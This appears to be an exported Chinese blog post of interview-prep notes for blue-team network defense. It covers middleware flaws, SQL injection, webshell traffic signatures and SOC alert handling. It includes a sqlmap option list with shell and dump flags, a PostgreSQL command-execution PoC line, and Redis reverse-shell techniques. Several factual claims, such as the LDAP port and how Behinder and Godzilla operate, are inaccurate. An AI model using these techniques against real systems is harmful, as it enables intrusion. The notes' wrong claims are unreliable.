fastjson\n\n\n\n### 客服有映射到外网的服务器被打进来了，如何溯源\n\n\n\n### 常见的中间件漏洞\n\nIIS\n\n- 解析漏洞\n- put任意文件写入\n- 段文件漏洞\n\napache\n\n- 未知扩展名解析漏洞\n- addhandler导致的解析漏洞\n- 换行解析漏洞\n\nnginx\n\n- 解析漏洞\n- 空字节任意代码执行\n- 文件名逻辑漏洞‘\n- 配置错误导致的安全问题\n\ntomcat\n\n- 任意文件写入\n- 远程代码执行\n- 弱口令+后台getshell\n\njboss\n\n- 反序列化漏洞\n- 弱口令\n\n### ngsoc冷热数据\n\n奇安信网神态势感知与安全运营平台（简称NGSOC）\n\n\n\n### 代理工具类告警，流量特征\n\n\n\n### 你感觉windows漏洞多还是linux漏洞多\n\n个人觉得linux漏洞多，debian linux漏洞最多\n\n\n\n### 永恒之蓝\n\n2017年\n\n用Windows系统的SMB协议漏洞来获取系统的最高权限 139，445端口\n\n\n\n### sql注入写文件\n\nload_file()读文件 into outfile / into dumpfile写文件\n\n\n\n### 正向代理反向代理\n\n正向代理代理的对象是客户端，反向代理代理的对象是服务端。\n\n\n\n### 延时注入在流量告警上如何判断的\n\n\n\n### 宽字节\n\n一个字符数大小为两个字节的为宽字节，比如GBK编码，我们汉字通常使用的就是GBK编码，也就是说一次性会读取两个字节。\n\n当我们的mysql使用GBK编码后，同时两个字符的前一个字符ASCII码大于128时，会将两个字符认成一个汉字\n\n\n\n### 流量代理工具有哪些\n\nvpn，Shadowsocks，Trojan，WireGuard\n\n\n\n### 冰蝎与哥斯拉的连接特征\n\n冰蝎和哥斯拉都是利用远程管理工具（如Apache Struts漏洞）进行攻击，然后利用远程桌面协议（RDP）或SSH进行横向移动。\n\n都能够进行远程控制\n\n都可以进行数据窃取\n\n使用加密通信\n\n\n\n### 怎么判断逻辑漏洞是否攻击成功\n\n1. 行为变化：逻辑漏洞攻击成功后，攻击者可能会进行一些行为变化，比如访问一些不应该被访问的资源，或者执行一些不应该被执行的操作。\n2. 数据变化：逻辑漏洞攻击成功后，攻击者可能会修改、删除或者新增某些数据。\n3. 系统响应：逻辑漏洞攻击成功后，系统可能会出现异常响应，比如返回异常的HTTP状态码或者错误信息。\n4. 安全日志：逻辑漏洞攻击成功后，可能会在系统的安全日志中留下痕迹，比如异常访问记录、错误日志等。\n\n\n\n\n\n### sql注入修复方式\n\n- SQL语句预编译\n- 针对SQL输入内容进行限制、过滤 //目前使用WAF对这一块进行处理\n- 针对提交的关键数据进行转义 ，比如\\select\n- 关闭错误信息输出 ，因为有些错误返回信息，会返回物理路径、数据库版本信息等\n- 数据库权限严格控制 ，不同级别的用户，只能进行相应级别权限的操作\n- 敏感信息严格加密处理\n\n\n\n### 天眼与ngsoc区别\n\nNGSOC主要应用于较为复杂、高风险的网络环境，如金融机构、能源公司等，其主要优点是可以集成多种不同的安全监测工具，实现信息的智能化分析和响应；而天眼则更加注重对企业内部网络资产的保护，具备网络漏洞检测和入侵攻击检测等多种功能。\n\n\n\n### 文件上传漏洞如何防御\n\n- 检查文件上传路径 ( 避免 0x00 截断、 IIS6.0 文件夹解析漏洞、目录遍历 )\n\n- 文件扩展名检测 ( 避免服务器以非图片的文件格式解析文件 ),验证文件扩展名 通常有两种方式 : 黑名单和白名单 .\n\n- 文件 MIME验证 ( 比如 GIF 图片 MIME为 image/gif,CSS 文件的 MIME为 text/css 等 ) 3. 文件内容检测 ( 避免图片中插入 webshell)\n\n- 图片二次渲染 ( 最变态的上传漏洞防御方式 , 基本上完全避免了文件上传漏洞 )\n\n- 文件重命名 ( 如随机字符串或时间戳等方式 , 防止攻击者得到 webshell 的路径 )\n\n- 隐藏上传路径\n\n\n\n### xff\n\nx-forwarded-for 表了HTTP的请求端真实的IP\n\n可以进行sql注入\n\n\n\n### sql注入写文件前提\n\n- 对web目录具有读写权限\n- 知道文件绝对路径\n- 能够使用联合查询（sql注入时）\n- secure_file_priv，File_priv\n\n\n\n### sqlmap一些参数\n\n```\n-h                  输出参数说明\n-hh                 输出详细的参数说明\n-v                  输出级别（0~6，默认1）\n-u url              指定url\n--data=DATA         该参数指定的数据会被作为POST数据提交\n-r file.txt         常用于POST注入或表单提交时注入\n-p / --skip         指定/跳过测试参数\n--cookie            设置cookie\n--force-ssl         强制使用SSL\n--threads           指定线程并发数\n--prefix            指定前缀\n--suffix            指定后缀\n--level             检测级别（1~5，默认1）\n--risk              风险等级（1~4，默认1）\n--all               列举所有可访问的数据（不推荐）\n--banner            列举数据库系统的信息等\n--current-user      输出当前用户\n--current-db        输出当前所在数据库\n--hostname          输出服务器主机名\n--is-dba            检测当前用户是否为管理员\n--users             输出数据库系统的所有用户\n--dbs               输出数据库系统的所有数据库\n-D DB               指定数据库\n--tables            在-D情况下输出库中所有表名\n-T table            在-D情况下指定数据表\n--columns           在-D -T情况下输出表中所有列名\n-C column           在-D -T情况下输出某列数据的值\n--dump              拉取数据存放到本地\n--dump-all          拉取所有可访问数据存放到本地\n--count             输出数据条目数量\n--search            搜索数据库名、表明、列名，需要与-D -T或-C 联用\n--sql-query         执行任意的SQL语句\n--sql-shell         使用交互式SQL语句执行环境\n--flie-read         读取文件\n--file-write        上传文件（指定本地路径）\n--file-dest         上传文件（指定目标机器路径）\n--os-cmd            执行任意系统命令\n--os-shell          使用交互式shell执行命令\n--batch             所有要求输入都选取默认值\n--wizard            初学者向导\n```\n\n\n\n\n\n### csrf\n\n攻击者可以盗用你的登陆信息，以你的身份模拟发送各种请求对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作\n\nCSRF 攻击的三个条件 :\n\n       1 . 用户已经登录了站点 A，并在本地记录了 cookie\n    \n       2 . 在用户没有登出站点 A 的情况下（也就是 cookie 生效的情况下），访问了恶意攻击者提供的引诱危险站点 B (B 站点要求访问站点A)。\n    \n       3 . 站点 A 没有做任何 CSRF 防御\n\n**漏洞检测**\n\n检测CSRF漏洞最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。\n\n\n\n**防御**\n\n1. 验证 HTTP Referer 字段；\n2. 在请求地址中添加 token 并验证；\n3. 在 HTTP 头中自定义属性并验证；\n4. Chrome 浏览器端启用 SameSite cookie\n\n\n\n### ssrf\n\n服务端请求伪造(Server-Side Request Forgery),指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。\n\n防御\n\n1、过滤返回的信息，如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。\n\n2、统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态。\n\n3、限制请求的端口，比如80,443,8080,8090。\n\n4、禁止不常用的协议，仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp://等引起的问题。\n\n5、使用DNS缓存或者Host白名单的方式。\n\n\n\n### 水坑漏洞\n\n水坑攻击（Watering Hole Attack）”是一种网络攻击方式。攻击者通过在特定网页中植入恶意代码，来攻击访问该网页的用户\n\n防御\n\n（1）    及时更新操作系统及应用程序，修复已知漏洞；\n\n（2）    安装可以信赖的安全软件，及时发现网页浏览过程中的异常行为；\n\n（3）    监测所有网络传输流量，及时发现异常通信；\n\n\n\n### 鱼叉攻击\n\n鱼叉攻击，肯定是有看到了鱼再叉，也就是有针对性的攻击，目标明确，比如公司或团体，给这些特定团体发送包含木马的邮件，这种邮件要让受害者打开，就需要一个欺骗和迷惑的标题。这个题目和内容的构造就考验红方的想象力了。比如打补丁的通知邮件，放假通知安排，投诉举报，简历投递或者来点公司的劲爆信息引爆吃瓜群众。员工点了附件之后，就中了木马，黑客在远端就可以远程控制这个电脑了。\n\n### tomcat可以执行的后缀名\n\njsp html htm js css xml gif jpg png pdf doc xls\n\n### ssrf有哪些协议\n\nhttp https ftp smtp dns file \n\n\n\n### mysql数据库系统执行函数\n\n\n\n### nmap参数\n\n- -sS 半开扫描(TCP SYN扫描)，执行速度快，不容易被注意到，可以避免被记入目标系统的日志，需要root权限。它常常被称为半开放扫描， 因为它不打开一个完全的TCP连接。它发送一个SYN报文， 就像您真的要打开一个连接，然后等待响应。\n- -sT 当SYN扫描不能用时，TCP Connect()扫描就是默认的TCP扫描。会在⽬标主机的⽇志中记录⼤批连接请求和错误信息，但是由于是tcp connect()扫描，容易被记录。当SYN扫描可用时，它通常是更好的选择\n- -sP ping扫描，Nmap在扫描端⼜时，默认都会使⽤ping扫描，只有主机存活，Nmap才会继续扫描。\n- -sU UDP扫描，但UDP扫描是不可靠的，速度也比较慢\n- -sA 这种扫描与目前为止讨论的其它扫描的不同之处在于 它不能确定open(开放的)或者 open|filtered(开放或者过滤的))端口。 它用于发现防火墙规则，确定它们是有状态的还是无状态的，哪些端口是被过滤的。\n- -sV 探测端⼜服务版本\n- -Pn 扫描之前不需要⽤ping命令，有些防⽕墙禁⽌ping命令。可以使⽤此选项进⾏扫描\n- -v 显⽰扫描过程，推荐使⽤\n- -p 指定端⼜，如“1-65535、1433、135、22、80”等\n- -O 启⽤远程操作系统检测，存在误报\n- -O --osscan-limit 针对指定的目标进行操作系统检测\n- -O --osscan-guess 当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认 进行这种匹配\n- -A 全⾯系统检测、启⽤脚本检测、扫描等\n- -oN/-oX/-oG 将报告写⼊⽂件，分别是正常、XML、grepable 三种格式\n- -iL 读取主机列表，例如，-iL “C:\\ip.txt”\n\n\n\n### 天眼可以检测逻辑漏洞吗\n\n天眼的漏洞扫描模块主要基于静态代码分析和黑盒测试技术，对于逻辑漏洞的检测能力相对有限。\n\n\n\n### 内网渗透工具，代理\n\n\n\n### 渗透测试流程\n\n- 确定目标和范围：定义渗透测试的目标和范围，包括要测试的系统、应用程序、网络、物理设施等。\n- 收集情报：收集有关目标系统的信息，例如 IP 地址、操作系统类型、应用程序版本、网络拓扑等，以便进行后续测试。\n- 漏洞扫描：使用漏洞扫描工具对目标系统进行扫描，以发现已知的漏洞和弱点。\n- 渗透测试：通过手动测试和自动化工具进行渗透测试，包括尝试各种攻击向量，如 SQL 注入、XSS 攻击、文件包含漏洞、社交工程等。\n- 提交漏洞报告：将发现的漏洞和安全弱点整理成报告，详细描述漏洞的影响和风险，并提供建议和修复措施。\n- 清理痕迹：在测试完成后，清除所有测试过程中留下的痕迹，确保不会对目标系统造成任何影响或损害。\n- 重复测试：在修复漏洞后，进行重复测试以确认漏洞已被修复，并且没有引入新的漏洞。\n\n\n\n### 天眼日志分析语法                                                                                                     \n\n天眼日志分析语法（TianEye Log Query Syntax）是指在奇安信的天眼平台上，用于查询、分析和可视化各种日志数据的语法。以下是一些常见的天眼日志分析语法示例：\n\n1. 关键字查询：使用关键字查询指定时间段内的日志数据。例如，查询访问时间为2022年4月1日至4月30日之间的所有日志：\n\n```\nindex=xxx sourcetype=yyy access_time>=2022-04-01 access_time<=2022-04-30\n```\n\n精确匹配查询：使用精确匹配查询指定某个字段的值。例如，查询客户端 IP 地址为 192.168.1.100 的所有日志：\n\n```\nindex=xxx sourcetype=yyy client_ip=192.168.1.100\n```\n\n多条件查询：使用多个条件查询组合查询结果。例如，查询客户端 IP 地址为 192.168.1.100，且访问时间为2022年4月1日至4月30日之间的所有日志：\n\n```\nindex=xxx sourcetype=yyy client_ip=192.168.1.100 access_time>=2022-04-01 access_time<=2022-04-30\n```\n\n聚合查询：使用聚合函数统计查询结果。例如，查询某个时间段内 HTTP 访问次数最多的前 10 个客户端 IP 地址：\n\n```\nindex=xxx sourcetype=yyy access_time>=2022-04-01 access_time<=2022-04-30 | top 10 client_ip\n```\n\n可视化查询：使用可视化组件将查询结果可视化。例如，使用柱状图可视化某个时间段内 HTTP 访问次数最多的前 10 个客户端 IP 地址：\n\n```\nindex=xxx sourcetype=yyy access_time>=2022-04-01 access_time<=2022-04-30 | \n```\n\n### 天眼流量分析和威胁检测区别\n\n天眼流量分析和威胁检测是奇安信的天眼平台提供的两个不同的功能模块，它们的主要区别如下：\n\n1. 功能目标不同：天眼流量分析的主要目标是分析网络流量，了解网络拓扑结构、通信情况和性能状况，发现网络异常和瓶颈问题等；而威胁检测的主要目标是检测和预防网络威胁和攻击，包括漏洞扫描、入侵检测、恶意代码检测、网络流量分析等多个方面。\n2. 数据来源不同：天眼流量分析主要关注网络流量数据，可以采集和分析网络设备、流量数据、协议、应用等方面的数据；而威胁检测则需要多种数据源的支持，如安全事件日志、主机安全数据、网络安全数据、终端安全数据等。\n3. 数据处理方式不同：天眼流量分析主要采用流量抓包、协议解析、拓扑分析等技术进行数据处理和分析；而威胁检测则采用多种技术手段进行数据处理和分析，如恶意代码识别、行为分析、异常检测、漏洞扫描等。\n4. 应用场景不同：天眼流量分析主要适用于网络运维、网络性能分析、网络安全监控等领域；而威胁检测则适用于网络安全、信息安全等领域，可以帮助企业发现和防范各种网络威胁和攻击。\n\n\n\n### 天眼可以审0day吗\n\n不可以\n\n### 怎么判断自己的机器是不是域控\n\n1. 打开计算机管理器：在 Windows 操作系统中，可以通过在开始菜单中搜索“计算机管理器”来打开计算机管理器。\n2. 查看域：在计算机管理器中，展开“本地用户和组”或“计算机管理”等选项卡，然后选择“域”。如果机器加入了域并成为域控制器，将会在此处看到域的名称和其他域控制器的信息。\n3. 检查服务：在 Windows 操作系统中，域控制器会运行一些特定的服务，比如“Active Directory域服务”，“DNS服务器服务”等。可以通过打开“服务”选项卡来查看这些服务是否在运行，并且是否是自动启动。\n4. 检查系统信息：在 Windows 操作系统中，可以通过打开“系统信息”来查看机器的详细信息。在其中的“系统摘要”选项卡中，如果机器是域控制器，将会看到“角色”一栏显示“域控制器”。\n\n### 常见webshell流量体征\n\n- 异常流量：Webshell的流量通常会显示为异常流量，因为攻击者通常会通过Webshell上传和下载文件、执行命令等操作，这些操作都会产生大量不正常的流量。\n- 带有特定字符或字符串：Webshell可能会带有特定字符或字符串，如“eval(base64_decode(”，这些字符或字符串用于解码Webshell的命令或脚本，攻击者可能会使用这些字符或字符串来隐藏Webshell。\n- 频繁访问：Webshell的访问可能会比正常的用户访问频率更高，这是因为攻击者需要不断访问Webshell以获取控制目标服务器的权限。\n- 长时间运行的连接：Webshell的流量可能会包含长时间运行的连接，这是因为攻击者通常会保持Webshell的连接以便在需要时执行更多的操作。\n- 异常文件：Webshell可能会通过上传和下载文件来执行操作，因此出现异常文件或文件类型也可能是Webshell的流量体征。\n\n\n\n### 常用数据库默认端口及漏洞\n\n- 89 端口（ldap）安全漏洞：未授权访问 、弱口令\n  利用方式：通过LdapBrowser工具直接连入。\n- 1433 端口（Mssql）安全漏洞：弱口令、暴力破解\n  利用方式：差异备份getshell、SA账户提权等\n\n- 1521 端口（Oracle）安全漏洞：弱口令、暴力破解\n  利用方式：通过弱口令/暴力破解进行入侵。\n\n- 3306 端口（MySQL）安全漏洞：弱口令、暴力破解\n  利用方式：利用日志写入webshell、udf提权、mof提权等。\n\n- 5432 端口（ PostgreSQL）安全漏洞：弱口令、高权限命令执行\n  利用方式：攻击者通过弱口令获取账号信息，连入postgres中，可执行系统命令。PoC参考： DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM ‘id’; SELECT * FROM cmd_exec;\n\n- 5984 端口（CouchDB）安全漏洞：垂直权限绕过、任意命令执行\n  利用方式：通过构造数据创建管理员用户，使用管理员用户登录，构造恶意请求触发任意命令执行。后台访问：http://:5984/_utils\n\n- 6379 端口（Redis）安全漏洞：未授权访问\n  利用方式：绝对路径写webshell 、利用计划任务执行命令反弹shell、公私钥认证获取root权限、主从复制RCE等。\n\n- 9200 端口（elasticsearch）安全漏洞：未授权访问、命令执行\n\n### 目标ip是邮件服务器要怎么处理\n\n1. 检查邮件服务器是否正常运行：您可以通过尝试连接到邮件服务器并发送一封电子邮件来检查邮件服务器是否正常运行。如果邮件服务器无法连接或无法发送电子邮件，则可能需要检查邮件服务器的配置或网络设置。\n2. 检查安全设置：邮件服务器需要设置安全措施以保护电子邮件和用户数据，如防火墙、反病毒软件和邮件过滤器等。您可以检查这些设置是否已启用或需要进行更新。\n3. 更新邮件服务器软件：如果您的邮件服务器软件已经过时，可能需要更新到最新版本以修复可能存在的安全漏洞和错误。\n4. 监控邮件服务器流量：监控邮件服务器的流量可以帮助您识别和防止未经授权的访问或攻击。您可以使用日志分析工具或流量监控工具来监控邮件服务器的流量，并检查是否存在异常活动。\n5. 增强安全措施：除了基本的安全措施，您还可以考虑增强邮件服务器的安全措施，如强密码策略、多因素身份验证和加密等。这些措施可以帮助保护邮件服务器免受恶意\n\n### 目的ip是114.114.114.114端口是53需要封禁吗\n\n\n\n### 群里面遇到exe可执行程序怎么处理\n\n1. 不要下载或运行未知来源的可执行程序。如果你不确定该程序是否安全，请询问发送者或其他群组成员。\n2. 使用杀毒软件进行扫描。如果你已经下载了该程序并想运行它，可以使用杀毒软件进行扫描，以确保它不包含任何恶意软件。\n3. 隔离该文件。如果你怀疑该程序可能会造成破坏，请将其隔离在一个安全的位置，以防止其对你的计算机系统造成任何影响。\n4. 通知管理员。如果你认为该程序可能会对其他群组成员造成威胁，请及时通知管理员或相关人员，并让他们采取适当的措施来处理该问题。\n5. 虚拟机打开\n\n### 遇到远控木马告警如何处理\n\n1. 立即断开网络连接。为了防止该木马进一步攻击计算机或服务器，你应该立即断开网络连接，包括断开无线网络和网线连接等。\n2. 扫描计算机或服务器。使用安全软件对计算机或服务器进行全面扫描，以检测和清除远控木马。确保使用更新的杀毒软件，以提高检测和清除恶意软件的能力。\n3. 更改密码。更改所有重要帐户的密码，例如电子邮件、在线银行、社交媒体等。确保密码是复杂且难以猜测的，建议使用密码管理器。\n4. 及时备份数据。备份所有重要数据，包括文件、文档、照片等，以防止数据丢失。\n5. 更新操作系统和软件。确保计算机或服务器上的操作系统和所有软件都是最新的，以填补可能的安全漏洞。\n6. 通知安全管理员。如果你在工作环境中发现远控木马，应立即通知安全管理员或信息安全团队，并遵循公司的安全政策和流程。\n\n\n\n### cs\n\n一款渗透测试神器\n\nhttps://blog.csdn.net/zzwwhhpp/article/details/111773395\n\n\n\n### wireshark过滤条件\n\nip.src eq 192.168.1.107 or ip.dst eq 192.168.1.107\n\n或者\n\nip.addr eq 192.168.1.107 // 都能显示来源IP和目标IP\n\n\n\ntcp.port eq 80 // 不管端口是来源的还是目标的都显示\n\ntcp.port == 80\n\ntcp.port eq 2722\n\ntcp.port eq 80 or udp.port eq 80\n\ntcp.dstport == 80 // 只显tcp协议的目标端口80\n\ntcp.srcport == 80 // 只显tcp协议的来源端口80\n\n udp.port eq 15000\n\n 过滤端口范围\n\ntcp.port >= 1 and tcp.port <= 80\n\n\n\n\nth.dst == A0:00:00:04:C5:84 // 过滤目标mac\n\neth.src eq A0:00:00:04:C5:84 // 过滤来源mac\n\neth.dst==A0:00:00:04:C5:84\n\neth.dst==A0-00-00-04-C5-84\n\neth.addr eq A0:00:00:04:C5:84 // 过滤来源MAC和目标MAC都等于A0:00:00:04:C5:84的\n\n\n\nhttp.request.method == “GET”\n\nhttp.request.method == “POST”\n\nhttp.request.uri == “/img/logo-edu.gif”\n\nhttp contains “GET”\n\nhttp contains “HTTP/1.”\n\n\n\n### shiro反序列化漏洞\n\n1.1.3 漏洞原理\n\n  Apache Shiro框架提供了记住我的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过相关信息进行序列化，然后使用AES加密（对称），最后再使用Base64编码处理。服务端在接收cookie时：\n\n攻击者可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令\n\n### 蚁剑流量特征\n\n1.默认的 user-agent 请求头是 antsword xxx（可修改）\n\n 2.蚁剑的正文内容用URL加密，解密后流量最中明显的特征为ini_set(\"display_errors\",\"0\");\n\n\n\n### 勒索病毒传播方式有哪些\n\n- 网站挂马：用户浏览挂有木马病毒的网站，上网终端计算机系统极可能被植入木马并感染上勒索病毒。\n- 邮件传播：攻击者通过利用当前热门字样，在互联网上撒网式发送垃圾邮件、钓鱼邮件，一旦收件人点开带有勒索病毒的链接或附件，勒索病毒就会在计算机后台静默运行，实施勒索。\n- 漏洞传播：攻击者通过计算机操作系统和应用软件的漏洞攻击并植入病毒，最典型的案例是2017年在国内泛滥的WannaCry大规模勒索事件，攻击者正是利用微软445端口协议漏洞，进行感染传播网内计算机。\n- 捆绑传播：攻击者将勒索病毒与其他软件尤其是盗版软件、非法破解软件、激活工具进行捆绑，从而诱导用户点击下载安装，并随着宿主文件的捆绑安装进而感染用户的计算机系统。\n- 介质传播：攻击者通过提前植入或通过交叉使用感染等方式将携有勒索病毒的U盘、光盘等介质进行勒索病毒的移动式传播。\n\n### log4j漏洞\n\n该漏洞的主要原因是log4j在日志输出中，未对字符合法性进行严格的限制，执行了JNDI协议加载的远程恶意脚本，从而造成RCE\n\n\n\n### wireshark抓到数据包之后你怎么去分析\n\n\n\n### redis mongodb端口号\n\nredis 6379   \n\nmongoDB 27017\n\n\n\n### 天眼探针有什么功能\n\n\n\n### 天眼能否检索网络日志\n\n\n\n### struct2命令执行漏洞\n\nStruts2的action:、redirect:和redirectAction:前缀参数在实现其功能的过程中使用了Ognl表达式，并将用户通过URL提交的内容拼接入Ognl表达式中，从而造成攻击者可以通过构造恶意URL来执行任意Java代码，进而可执行任意命令\n\n\n\n### 如果目的端口为: x.X.x.x,操作系统win7或者win8，检索语句要怎么写\n\n\n\n### 怎么写模糊查询告警类型为写入文件的检索语句\n\n\n\n### 如果出现两条相同的sql注入告警你会怎么处理\n\n\n\n### 如果出现蠕虫病毒告警，如何处理\n\n\n\n### php命令执行函数\n\n**system()，passthru()，exec()，pcntl_exec()，shell_exec()，popen()/proc_popen()，反引号 ``**\n\n\n\n### 冰蝎流量特征\n\nAccept: application/json, text/javascript, */*; q=0.01\n\nContent-type: Application/x-www-form-urlencoded\n\n冰蝎设置了10种User-Agent,每次连接shell时会随机选择一个进行使用。\n\n冰蝎与webshell建立连接的同时，javaw也与目的主机建立tcp连接，每次连接使用本地端口在49700左右，每连接一次，每建立一次新的连接，端口就依次增加。\n\n$post=Decrypt(file_get_contents(\"php://input\"));\n\n\n\n### 哥斯拉流量特征\n\nAccept为text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\n\ncookie中分号结尾\n\n和请求体一样，请求响应体也分两个格式，base64编码的和原始加密raw数据。如果请求体采用base64编码，响应体返回的也是base64编码的数据。在使用base64编码时，响应体会出现一个很明显的固定特征。这个特征是客户端和服务端编写的时候引入的。\n\n从代码可以看到会把一个32位的md5字符串按照一半拆分，分别放在base64编码的数据的前后两部分。整个响应包的结构体征为：md5前十六位+base64+md5后十六位。\n从响应数据包可以明显看到这个特征，检测时匹配这个特征可以达到比较高的检出率，同时也只可以结合前面的一些弱特征进行检查，进一步提高检出率。因为md5的字符集范围在只落在0123456789ABCDEF范围内，因此很容易去匹配，正则匹配类似于(?i:[0-9A-F]{16})[\\w+/]{4,}=?=?(?i:[0-9A-F]{16})。需要注意的是md5需要同时匹配字母大小写两种情况，因为在JAVA版webshell响应中为大写字母，在PHP版中为小写字母。\n\n\n\n### 发现有入侵攻击，查看主机的哪些日志\n\n/var/log/\n\n\n\n### 如何防范反序列化漏洞\n\n防范反序列化漏洞的方法主要包括以下几点：\n\n1. 输入过滤：在接收用户输入时，进行有效性验证和输入过滤，避免恶意输入。\n2. 对象序列化前加密：对即将进行序列化的对象中的敏感数据或者方法进行加密处理，避免序列化后数据被篡改。\n3. 签名校验：利用数字签名技术，在序列化和反序列化的过程中添加签名机制，校验序列化对象是否经过篡改。\n4. 更新库文件：定期更新使用的序列化库文件，避免因为库文件中的漏洞而导致反序列化漏洞的产生。\n5. 减少依赖第三方类库：减少依赖第三方类库的情况，避免由于第三方类库中的漏洞而导致反序列化漏洞的产生。\n6. 最小化序列化：精简序列化对象中的属性，避免不必要的属性被序列化，从而降低反序列化的风险。\n\n以上是防范反序列化漏洞的一些基本方案。此外，如果使用的是Java语言，还可以通过Java Security Manager来控制反序列化操作的权限。在开发项目时，应该尽可能地避免使用Java反序列化操作，或者在进行序列化和反序列化操作时，更加谨慎的写好对应的代码和相关配置。\n\n\n\n### 天眼上显示多个不同url的SQL注入告警，可能是什么原因？\n\n可能是网站存在多个不同的漏洞点，或者攻击者利用了不同的注入方式和参数来尝试注入，导致出现多个不同的SQL注入告警。此外，也有可能是天眼扫描器在扫描过程中出现了误报或者漏报情况，需要对告警进行仔细分析和验证。建议及时修复漏洞点，防范SQL注入等安全威胁。\n\n\n\n### 我们在天眼上遇到文件上传告警时，应急响应的流程是怎样的？ 同一台资产多次发出同一个告警，可能的原因？\n\n应对文件上传告警的应急响应流程一般包括如下步骤：\n\n1. 确认告警情况：查看告警详细信息，包括文件类型、大小、上传时间、上传者、上传路径、上传方式、来源IP等，判断是否存在风险。\n2. 暂停上传功能：对于存在风险的上传功能，需要暂停上传功能，防止攻击者持续上传。\n3. 验证漏洞点：对上传功能进行全面测试，确认漏洞点，包括上传参数的类型、限制、验证等。\n4. 修复漏洞点：根据漏洞点的验证结果，提供相应的解决方案和实施措施，比如对上传文件进行类型、大小、扩展名、后缀名等多个方面的限制。\n5. 监测告警情况：在上传功能修复后，需对文件上传行为进行全面监测，查看是否仍然存在风险。\n\n同一台资产多次发出同一个告警可能是以下原因：\n\n1. 真实存在的漏洞：同一漏洞点被攻击者利用多次，导致多次告警。\n2. 系统误报：扫描器或监测设备存在误报，由于告警下发频繁，导致同一漏洞多次告警。\n3. 前置设备异常：网络设备、WAF等前置设备异常，导致同一个请求被多次拦截，产生多次告警。\n\n在排查告警原因时，需要进行仔细分析和判断，以确认是否存在真实风险。需要及时对真实漏洞进行修复和防范，对于误报和异常情况则需要针对性的进行排查和修复。\n\n\n\n### linux临时文件位置\n\n在Linux系统中，临时文件通常放置在以下几个目录中：\n\n1. /tmp目录：该目录是Linux系统中最常用的临时文件目录之一，任意用户都可以在该目录中创建、修改、删除文件。该目录下的文件在系统重启后会被清空。\n2. /var/tmp目录：该目录和/tmp目录类似，不同之处在于该目录下的文件在系统重启后不会被清空，需要手动删除。\n3. /dev/shm目录：该目录是一个ramfs文件系统，在内存中创建一个文件系统，并且把该文件系统挂载到/dev/shm目录下。该目录也可以作为临时文件目录使用，因为文件在内存中创建，所以读写速度较快。\n\n除了上述目录之外，还有一些应用程序会自己创建临时文件目录，例如Apache创建的临时文件夹为/var/cache/httpd，Nginx创建的临时文件目录为/var/run/nginx/client_body_temp。\n\n需要注意的是，在使用临时文件时，应尽可能使用系统默认的临时文件目录，避免用在不安全或者没有权限控制的目录。临时文件的权限也应该设置为仅能被创建者和目录管理员使用，并尽可能定期清理，以降低系统安全风险。\n\n\n\n### 使用天眼遇到sql告警怎么处理\n\n处理天眼上的SQL告警，一般需要按照以下步骤进行：\n\n1. 核实告警：对收到的告警首先进行核实，查看告警详情以确认告警是否为真实漏洞。\n2. 定位漏洞：确认告警存在后，需要进行漏洞定位，以查找漏洞原因和具体位置，检查SQL查询参数、输入过滤、数据库配置等方面。\n3. 修复漏洞：根据定位得到的漏洞内容，进行相应的安全加固和漏洞修复，比如优化SQL查询语句、加强输入过滤、修复数据库配置等。\n4. 验证修复结果：在修复漏洞后，需要再次测试系统以验证修复结果，确保系统安全性得到提高。\n5. 预防未来漏洞：在修复漏洞之后，需要对SQL注入漏洞进一步加强防范和监测，避免类似漏洞重演。\n\n需要注意的是，上述过程应该配合严格的访问控制和身份认证机制，并进行安全审计来保证系统的安全性。另外，如果使用天眼监测到SQL注入漏洞的话，可以结合其他安全工具如WAF来对系统进行进一步防御。通过不断加强安全防护链的研发和落地，能让系统安全得到有力地提升。","slug":"HW prepare","published":1,"updated":"2024-04-17T08:43:00.255Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7i50003h7767sr19j3y","content":"<h1 id=\"HW-prepare\"><a href=\"#HW-prepare\" class=\"headerlink\" title=\"HW prepare\"></a>HW prepare</h1><h3 id=\"对hw的理解\"><a href=\"#对hw的理解\" class=\"headerlink\" title=\"对hw的理解\"></a>对hw的理解</h3><p>我个人觉得护网行动是国家重视网络安全的一种体现，目的是发现企业政府安全问题并解决，提供安全能力</p>\n<p>hw分为蓝队防守方和红队攻击方</p>\n<h3 id=\"hw防守人员组成\"><a href=\"#hw防守人员组成\" class=\"headerlink\" title=\"hw防守人员组成\"></a>hw防守人员组成</h3><p>监控组：监控组主要就是对WAF、IPS等安全设备进行7*24小时监控、派发、跟踪、反馈安全威胁</p>\n<p>研判组：研判组主要是技术支撑，对于监控组发现的攻击行为进行技术研判</p>\n<p>网络处置组：网络处置组主要职责就是发现攻击时在防火墙上对攻击方进行IP封锁，溯源等等</p>\n<p>应用处置组：应用处置组主要就是对发现的攻击和漏洞进行风险处置、安全加固</p>\n<h3 id=\"安全产品了解哪些\"><a href=\"#安全产品了解哪些\" class=\"headerlink\" title=\"安全产品了解哪些\"></a>安全产品了解哪些</h3><ul>\n<li>防火墙一般不属于区域的边界，如数据中心中核心区域和业务区域的边界防火墙、园区网络边界防火墙等，主要做保证边界安全</li>\n<li>抗D也叫抗DDOS设备即流量清洗设备，一般部署与网络最外侧，防止大规模僵尸网络入侵，内部有一套完整的机制可以区分哪些流量是用户正常流量和僵尸网络流量，可以保障数据中心可以提供完整的数据中心服务；</li>\n<li>负载均衡设备分为全局负载均衡（GLB）和链路负载均衡（LLB）以及服务器负载均衡（SLB）。GLB可以保障用户可以访问就近的数据中心提供的服务资源，LLB可以保障流量的出栈负载均衡和入栈负载均衡。SLB可以保障服务器对外服务的时候负载更平均、可靠；</li>\n<li>WAF即<a 